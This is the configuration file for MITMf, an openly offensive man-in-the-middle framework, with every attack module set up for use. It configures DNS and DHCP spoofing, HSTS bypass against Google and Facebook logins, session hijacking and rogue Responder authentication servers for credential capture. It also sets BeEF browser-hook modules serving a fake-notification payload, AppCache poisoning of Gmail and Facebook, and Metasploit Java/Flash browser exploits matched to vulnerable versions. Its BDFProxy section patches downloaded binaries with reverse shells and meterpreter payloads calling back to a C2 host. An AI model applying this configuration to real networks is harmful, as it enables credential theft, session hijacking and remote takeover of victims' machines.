#
#MITMf configuration file
#

[MITMf]
	
	#
	#here you can set the arguments to pass to MITMf when it starts so all you need to do is run `python mitmf.py` 
	#(assuming you config file is in the default directory)
	#
	args=''

	#Required BeEF and Metasploit options
	[[BeEF]]
		beefip = 127.0.0.1
		beefport = 3000
		user = beef
		pass = beef

	[[Metasploit]]

		msfport = 8080    #Port to start Metasploit's webserver on that will host exploits
		rpcip = 127.0.0.1
		rpcpass = abc123
	
	[[SMB]]

		#
		#Here you can configure MITMf's internal SMB server
		#

		#Set a custom challenge
		Challenge = 1122334455667788

	[[DNS]]

		#
		#Here you can configure MITMf's internal DNS server
		#

		tcp      = Off        #Use the TCP DNS proxy instead of the default UDP (not fully tested, might break stuff!)
		port     = 53         #Port to listen on
		ipv6     = Off        #Run in IPv6 mode (not fully tested, might break stuff!)

		#
		#Supported formats are 8.8.8.8#53 or 4.2.2.1#53#tcp or 2001:4860:4860::8888
		#can also be a comma seperated list e.g 8.8.8.8,8.8.4.4
		#
		nameservers = 8.8.8.8

		[[[A]]]     # Queries for IPv4 address records
		*.thesprawls.org=192.0.2.1

		[[[AAAA]]]  # Queries for IPv6 address records
		*.thesprawl.org=2001:db8::1

		[[[MX]]]    # Queries for mail server records
		*.thesprawl.org=mail.fake.com

		[[[NS]]]    # Queries for mail server records
		*.thesprawl.org=ns.fake.com

		[[[CNAME]]] # Queries for alias records
		*.thesprawl.org=www.fake.com

		[[[TXT]]]   # Queries for text records
		*.thesprawl.org=fake message

		[[[PTR]]]   # PTR queries
		*.2.0.192.in-addr.arpa=fake.com

		[[[SOA]]] #FORMAT: mname rname t1 t2 t3 t4 t5
		*.thesprawl.org=ns.fake.com. hostmaster.fake.com. 1 10800 3600 604800 3600

		[[[NAPTR]]] #FORMAT: order preference flags service regexp replacement
		*.thesprawl.org=100 10 U E2U+sip !^.*$!sip:customer-service@fake.com! .

		[[[SRV]]] #FORMAT: priority weight port target
		*.*.thesprawl.org=0 5 5060 sipserver.fake.com

		[[[DNSKEY]]] #FORMAT: flags protocol algorithm base64(key)
		*.thesprawl.org=256 3 5 AQPSKmynfzW4kyBv015MUG2DeIQ3Cbl+BBZH4b/0PY1kxkmvHjcZc8nokfzj31GajIQKY+5CptLr3buXA10hWqTkF7H6RfoRqXQeogmMHfpftf6zMv1LyBUgia7za6ZEzOJBOztyvhjL742iU/TpPSEDhm2SNKLijfUppn1UaNvv4w==

		[[[RRSIG]]] #FORMAT: covered algorithm labels labels orig_ttl sig_exp sig_inc key_tag name base64(sig)
		*.thesprawl.org=A 5 3 86400 20030322173103 20030220173103 2642 thesprawl.org. oJB1W6WNGv+ldvQ3WDG0MQkg5IEhjRip8WTrPYGv07h108dUKGMeDPKijVCHX3DDKdfb+v6oB9wfuh3DTJXUAfI/M0zmO/zz8bW0Rznl8O3tGNazPwQKkRN20XPXV6nwwfoXmJQbsLNrLfkGJ5D6fwFm8nN+6pBzeDQfsS3Ap3o=

#
#Plugin configuration starts here
#

[Spoof]

	[[DHCP]]
		ip_pool = 192.168.2.10-50
		subnet = 255.255.255.0
		dns_server = 192.168.2.20 #optional

[Replace]
	
	[[Regex1]]
		'Google Search' = 'Google In My Pants'

	[[Regex2]]
		"I'm Feeling Lucky" = "I'm Feeling Something In My Pants"

[Ferret-NG]
	#
	# Here you can specify the client to hijack sessions from
	#

	Client = '192.168.20.126'

[SSLstrip+]
	
	#
	#Here you can configure your domains to bypass HSTS on, the format is real.domain.com = fake.domain.com
	#

	#for google and gmail
	accounts.google.com = account.google.com
	mail.google.com = gmail.google.com
	accounts.google.se = cuentas.google.se

	#for facebook
	www.facebook.com = social.facebook.com

[Responder]

	#Set these values to On or Off, so you can control which rogue authentication server is turned on.
	MSSQL = On
	Kerberos = On
	FTP   = On
	POP   = On
	SMTP  = On #Listens on 25/TCP, 587/TCP
	IMAP  = On 
	LDAP  = On

	#Set this option with your in-scope targets (default = All)
	#Ex. RespondTo = 10.20.1.116,10.20.1.117,10.20.1.118,10.20.1.119
	RespondTo =

	#Set this option with specific NBT-NS/LLMNR names to answer to (default = All)
	#Ex. RespondTo = WPAD,DEV,PROD,SQLINT
	RespondToName = 

	#DontRespondTo = 10.20.1.116,10.20.1.117,10.20.1.118,10.20.1.119
	DontRespondTo = 

	#Set this option with specific NBT-NS/LLMNR names not to respond to (default = None)
	#Ex. DontRespondTo = NAC, IPS, IDS
	DontRespondToName =

	#Set your custom PAC script
	WPADScript = 'function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "RespProxySrv")||shExpMatch(host, "(*.RespProxySrv|RespProxySrv)")) return "DIRECT"; return "PROXY ISAProxySrv:3141; DIRECT";}'

[BeEFAutorun]
	#Example config for the BeefAutorun plugin

	mode = oneshot 
	#can be set to loop, or oneshot

	#in loop mode the plugin will run modules on all hooked browsers every 10 seconds
	#in oneshot mode the plugin will run modules only once per hooked browser

	[[ALL]]  #Runs specified modules on all hooked browsers

		'Man-In-The-Browser'= '{}'

	[[targets]]  #Runs specified modules based on OS and Browser type
		
		[[[Windows]]]  #Target all Windows versions using Firefox and Internet Explorer
			
			[[[[FF]]]]
				'Fake Notification Bar (Firefox)' = '{"url": "http://example.com/payload", "notification_text": "Click this if you dare"}'

			[[[[IE]]]]
				'Fake Notification Bar (IE)' = '{"notification_text": "Click this if you dare"}'

		[[[Windows 7]]]  #Target only Windows 7 using Chrome
			
			[[[[C]]]]
				'Fake Notification Bar (Chrome)' = '{"url": "http://example.com/payload", "notification_text: "Click this if you dare"}'

		[[[Linux]]] #Target Linux platforms using Chrome

			[[[[C]]]]
				'Redirect Browser (Rickroll)' = '{}'

[AppCachePoison]
	# HTML5 AppCache poisioning attack
	# see http://blog.kotowicz.net/2010/12/squid-imposter-phishing-websites.html for description of the attack.
	# generic settings for tampering engine
	
	#enable_only_in_useragents=Chrome|Firefox

	templates_path=config/app_cache_poison_templates

	# when visiting first url matching following expression we will embed iframes with all tamper URLs
	#(to poison the cache for all of them all at once)

	mass_poison_url_match=http://.*prezydent\.pl.*
	
	# it's only useful to mass poison chrome because:
	# - it supports iframe sandbox preventing framebusting
	# - does not ask for confirmation

	mass_poison_useragent_match=Chrome|Safari

	[[test]]
		# any //example.com URL redirects to iana and will display our spoofed content
		
		tamper_url=http://example.com/
		manifest_url=http://www.iana.org/robots.txt #use existing static URL that is rarely seen by the browser user, but exists on the server (no 404!)
		templates=test # which templates to use for spoofing content?
		skip_in_mass_poison=1

	[[gmail]]
		#use absolute URLs - system tracks 30x redirects, so you can put any URL that belongs to the redirection loop here

		tamper_url=http://mail.google.com/mail/
		
		# manifest has to be of last domain in redirect loop
		
		manifest_url=http://mail.google.com/robots.txt
		templates=default # could be omitted

	[[google]]
		tamper_url = http://www.google.com/
		manifest_url = http://www.google.com/robots.txt

	[[facebook]]
		tamper_url=http://www.facebook.com/?_rdr
		manifest_url=http://www.facebook.com/robots.txt
		templates=facebook # use different template

	[[twitter]]
		tamper_url=http://twitter.com/
		#tamper_url_match=^http://(www\.)?twitter\.com/$
		manifest_url=http://twitter.com/robots.txt

	[[html5rocks]]
		tamper_url=http://www.html5rocks.com/en/
		manifest_url=http://www.html5rocks.com/robots.txt

	[[ga]]
		# we can also modify non-HTML URLs to append malicious code to them
		# but for them to be cached in HTML5 AppCache they need to be referred in
		# manifest for a poisoned domain
		# if not, they are "only" cached for 10 years :D

		raw_url=http://www.google-analytics.com/ga.js
		templates=script
		skip_in_mass_poison=1
		#you can add other scripts in additional sections like jQuery etc.

[BrowserSniper]
	#
	# Currently only supports java, flash and browser exploits
	#
	# The version strings were pulled from http://www.cvedetails.com
	#
	# When adding java exploits remember the following format: version string (eg 1.6.0) + update version (eg 28) = 1.6.0.28
	#
	
	[[multi/browser/java_rhino]] #Exploit's MSF path
		
		Type = PluginVuln  #Can be set to PluginVuln, BrowserVuln
		OS   = Any         #Can be set to Any, Windows or Windows + version (e.g Windows 8.1)

		Browser = Any   #Can be set to Any, Chrome, Firefox, IE or browser + version (e.g IE 6)
		Plugin  = Java  #Can be set to Java, Flash (if Type is BrowserVuln will be ignored)

		#An exact list of the plugin versions affected (if Type is BrowserVuln will be ignored)
		PluginVersions = 1.6.0, 1.6.0.1, 1.6.0.10, 1.6.0.11, 1.6.0.12, 1.6.0.13, 1.6.0.14, 1.6.0.15, 1.6.0.16, 1.6.0.17, 1.6.0.18, 1.6.0.19, 1.6.0.2, 1.6.0.20, 1.6.0.21, 1.6.0.22, 1.6.0.23, 1.6.0.24, 1.6.0.25, 1.6.0.26, 1.6.0.27, 1.6.0.3, 1.6.0.4, 1.6.0.5, 1.6.0.6, 1.6.0.7, 1.7.0

	[[multi/browser/java_atomicreferencearray]]

		Type    = PluginVuln
		OS      = Any
		Browser = Any
		Plugin  = Java
		PluginVersions = 1.5.0, 1.5.0.1, 1.5.0.10, 1.5.0.11, 1.5.0.12, 1.5.0.13, 1.5.0.14, 1.5.0.15, 1.5.0.16, 1.5.0.17, 1.5.0.18, 1.5.0.19, 1.5.0.2, 1.5.0.20, 1.5.0.21, 1.5.0.22, 1.5.0.23, 1.5.0.24, 1.5.0.25, 1.5.0.26, 1.5.0.27, 1.5.0.28, 1.5.0.29, 1.5.0.3, 1.5.0.31, 1.5.0.33, 1.5.0.4, 1.5.0.5, 1.5.0.6, 1.5.0.7, 1.5.0.8, 1.5.0.9, 1.6.0, 1.6.0.1, 1.6.0.10, 1.6.0.11, 1.6.0.12, 1.6.0.13, 1.6.0.14, 1.6.0.15, 1.6.0.16, 1.6.0.17, 1.6.0.18, 1.6.0.19, 1.6.0.2, 1.6.0.20, 1.6.0.21, 1.6.0.22, 1.6.0.24, 1.6.0.25, 1.6.0.26, 1.6.0.27, 1.6.0.29, 1.6.0.3, 1.6.0.30, 1.6.0.4, 1.6.0.5, 1.6.0.6, 1.6.0.7, 1.7.0, 1.7.0.1, 1.7.0.2

	[[multi/browser/java_jre17_jmxbean_2]]
		
		Type    = PluginVuln
		OS      = Any
		Browser = Any
		Plugin  = Java
		PluginVersions = 1.7.0, 1.7.0.1, 1.7.0.10, 1.7.0.11, 1.7.0.2, 1.7.0.3, 1.7.0.4, 1.7.0.5, 1.7.0.6, 1.7.0.7, 1.7.0.9
	
	[[multi/browser/java_jre17_reflection_types]]

		Type    = PluginVuln
		OS      = Any
		Browser = Any
		Plugin  = Java
		PluginVersions = 1.7.0, 1.7.0.1, 1.7.0.10, 1.7.0.11, 1.7.0.13, 1.7.0.15, 1.7.0.17, 1.7.0.2, 1.7.0.3, 1.7.0.4, 1.7.0.5, 1.7.0.6, 1.7.0.7, 1.7.0.9
	
	[[multi/browser/java_verifier_field_access]]

		Type    = PluginVuln
		OS      = Any
		Browser = Any
		Plugin  = Java
		PluginVersions = 1.4.2.37, 1.5.0.35, 1.6.0.32, 1.7.0.4

	[[multi/browser/java_jre17_provider_skeleton]]

		Type    = PluginVuln
		OS      = Any
		Browser = Any
		Plugin  = Java
		PluginVersions = 1.7.0, 1.7.0.1, 1.7.0.10, 1.7.0.11, 1.7.0.13, 1.7.0.15, 1.7.0.17, 1.7.0.2, 1.7.0.21, 1.7.0.3, 1.7.0.4, 1.7.0.5, 1.7.0.6, 1.7.0.7, 1.7.0.9


	[[exploit/windows/browser/adobe_flash_pcre]]

		Type    = PluginVuln
		OS      = Windows
		Browser = Any
		Plugin  = Flash
		PluginVersions = 11.2.202.440, 13.0.0.264, 14.0.0.125, 14.0.0.145, 14.0.0.176, 14.0.0.179, 15.0.0.152, 15.0.0.167, 15.0.0.189, 15.0.0.223, 15.0.0.239, 15.0.0.246, 16.0.0.235, 16.0.0.257, 16.0.0.287, 16.0.0.296

	[[exploit/windows/browser/adobe_flash_net_connection_confusion]]

		Type    = PluginVuln
		OS      = Windows
		Browser = Any
		Plugin  = Flash
		PluginVersions = 13.0.0.264, 14.0.0.125, 14.0.0.145, 14.0.0.176, 14.0.0.179, 15.0.0.152, 15.0.0.167, 15.0.0.189, 15.0.0.223, 15.0.0.239, 15.0.0.246, 16.0.0.235, 16.0.0.257, 16.0.0.287, 16.0.0.296, 16.0.0.305

	[[exploit/windows/browser/adobe_flash_copy_pixels_to_byte_array]]

		Type    = PluginVuln
		OS      = Windows
		Browser = Any
		Plugin  = Flash
		PluginVersions = 11.2.202.223, 11.2.202.228, 11.2.202.233, 11.2.202.235, 11.2.202.236, 11.2.202.238, 11.2.202.243, 11.2.202.251, 11.2.202.258, 11.2.202.261, 11.2.202.262, 11.2.202.270, 11.2.202.273,11.2.202.275, 11.2.202.280, 11.2.202.285, 11.2.202.291, 11.2.202.297, 11.2.202.310, 11.2.202.332, 11.2.202.335, 11.2.202.336, 11.2.202.341, 11.2.202.346, 11.2.202.350, 11.2.202.356, 11.2.202.359, 11.2.202.378, 11.2.202.394, 11.2.202.400, 13.0.0.111, 13.0.0.182, 13.0.0.201, 13.0.0.206, 13.0.0.214, 13.0.0.223, 13.0.0.231, 13.0.0.241, 13.0.0.83, 14.0.0.110, 14.0.0.125, 14.0.0.137, 14.0.0.145, 14.0.0.176, 14.0.0.178, 14.0.0.179, 15.0.0.144

[FilePwn]

	#    BackdoorFactory Proxy (BDFProxy) v0.2 - 'Something Something'
	#
	#    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
	#
	#    Copyright (c) 2013-2014, Joshua Pitts
	#    All rights reserved.
	#
	#    Redistribution and use in source and binary forms, with or without modification,
	#    are permitted provided that the following conditions are met:
	#
	#        1. Redistributions of source code must retain the above copyright notice,
	#        this list of conditions and the following disclaimer.
	#
	#        2. Redistributions in binary form must reproduce the above copyright notice,
	#        this list of conditions and the following disclaimer in the documentation
	#        and/or other materials provided with the distribution.
	#
	#        3. Neither the name of the copyright holder nor the names of its contributors
	#        may be used to endorse or promote products derived from this software without
	#        specific prior written permission.
	#
	#    THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
	#    AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
	#    IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
	#    ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
	#    LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
	#    CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
	#    SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
	#    INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
	#    CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
	#    ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
	#    POSSIBILITY OF SUCH DAMAGE.
	#
	#    Tested on Kali-Linux.

	[[ZIP]]
		# patchCount is the max number of files to patch in a zip file
		# After the max is reached it will bypass the rest of the files 
		# and send on it's way

		patchCount = 5

		# In Bytes
		maxSize = 40000000

		blacklist = .dll,  #don't do dlls in a zip file

	[[TAR]]
		# patchCount is the max number of files to patch in a tar file
		# After the max is reached it will bypass the rest of the files
		# and send on it's way

		patchCount = 5

		# In Bytes
		maxSize = 40000000

		blacklist = ,   # a comma is null do not leave blank

	[[targets]]
		#MAKE SURE that your settings for host and port DO NOT
		# overlap between different types of payloads
		
		[[[ALL]]] # DEFAULT settings for all targets REQUIRED

			LinuxType = ALL 	# choices: x86/x64/ALL/None
			WindowsType = ALL 	# choices: x86/x64/ALL/None
			FatPriority = x64   # choices: x86 or x64
			
			FileSizeMax = 60000000  # ~60 MB (just under) No patching of files this large

			CompressedFiles = True #True/False
				
				[[[[LinuxIntelx86]]]]
					SHELL = reverse_shell_tcp   # This is the BDF syntax
					HOST = 192.168.1.168 		# The C2
					PORT = 8888
					SUPPLIED_SHELLCODE = None
					MSFPAYLOAD = linux/x86/shell_reverse_tcp	# MSF syntax
				
				[[[[LinuxIntelx64]]]]
					SHELL = reverse_shell_tcp
					HOST = 192.168.1.16
					PORT = 9999
					SUPPLIED_SHELLCODE = None
					MSFPAYLOAD = linux/x64/shell_reverse_tcp

				[[[[WindowsIntelx86]]]]
					PATCH_TYPE = APPEND #JUMP/SINGLE/APPEND
					# PATCH_METHOD overwrites PATCH_TYPE with jump
					# PATCH_METHOD = automatic
					PATCH_METHOD =
					HOST = 192.168.1.16
					PORT = 8443
					SHELL = iat_reverse_tcp_stager_threaded
					SUPPLIED_SHELLCODE = None
					ZERO_CERT = True
					PATCH_DLL = False
					MSFPAYLOAD = windows/meterpreter/reverse_tcp

				[[[[WindowsIntelx64]]]]
					PATCH_TYPE = APPEND #JUMP/SINGLE/APPEND
					# PATCH_METHOD overwrites PATCH_TYPE with jump
					# PATCH_METHOD = automatic
					PATCH_METHOD =
					HOST = 192.168.1.16
					PORT = 8088
					SHELL = iat_reverse_tcp_stager_threaded
					SUPPLIED_SHELLCODE = None
					ZERO_CERT = True
					PATCH_DLL = False
					MSFPAYLOAD = windows/x64/shell/reverse_tcp

				[[[[MachoIntelx86]]]]
					SHELL = reverse_shell_tcp
					HOST = 192.168.1.16
					PORT = 4444
					SUPPLIED_SHELLCODE = None
					MSFPAYLOAD = linux/x64/shell_reverse_tcp

				[[[[MachoIntelx64]]]]
					SHELL = reverse_shell_tcp
					HOST = 192.168.1.16
					PORT = 5555
					SUPPLIED_SHELLCODE = None
					MSFPAYLOAD = linux/x64/shell_reverse_tcp
